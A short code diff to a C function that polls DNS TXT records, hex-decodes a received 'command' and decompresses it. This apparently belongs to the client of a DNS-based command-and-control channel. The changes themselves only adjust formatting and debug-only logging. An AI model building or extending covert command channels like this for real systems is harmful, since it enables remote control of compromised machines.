@@ -99,7 +99,7 @@ void poll(client_t *client)
         return;
 
     // first byte seems to be a size byte maybe?
-    strlcpy(txt, (char *) ns_rr_rdata(rr) + 1, ns_rr_rdlen(rr));
+    strlcpy(txt, (char *)ns_rr_rdata(rr) + 1, ns_rr_rdlen(rr));
     // hex_dump("txt", &txt, sizeof(txt));
 
     if (strstr(txt, resp_idle) != NULL)
@@ -141,14 +141,16 @@ void poll(client_t *client)
 
         // str hex decode to byte array
         char gz_bytes[strlen(command) / 2];
+#ifdef DEBUG
         int w = hex_str_to_char(command, gz_bytes);
         hex_dump("gz_bytes", &gz_bytes, sizeof(gz_bytes));
 
-#ifdef DEBUG
         Dprintf(" - command hex %s\n", command);
         Dprintf(" - command hex str len: %lu\n", strlen(command));
         Dprintf(" - command decoding to gz_bytes wote %d bytes\n", w);
         Dprintf(" - gz_bytes len: %lu\n", sizeof(gz_bytes));
+#else
+        hex_str_to_char(command, gz_bytes);
 #endif
 
         // decompress
